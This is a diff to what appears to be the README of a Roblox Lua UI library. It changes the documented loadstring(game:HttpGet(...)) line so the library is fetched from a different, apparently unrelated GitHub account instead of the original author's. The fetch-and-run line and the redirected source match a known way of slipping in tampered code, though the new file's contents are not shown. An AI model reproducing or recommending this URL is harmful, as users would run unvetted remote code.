@@ -41,7 +41,7 @@
 To use the Obsidian UI Library, you need to assign it to a variable:
 
 ```lua
-local Library = loadstring(game:HttpGet("https://raw.githubusercontent.com/deividcomsono/Obsidian/refs/heads/main/Library.lua"))()
+local Library = loadstring(game:HttpGet("https://raw.githubusercontent.com/javierfabian828-maker/Obsidian/refs/heads/main/Library.lua"))()
 ```
 
 Then, create a window:
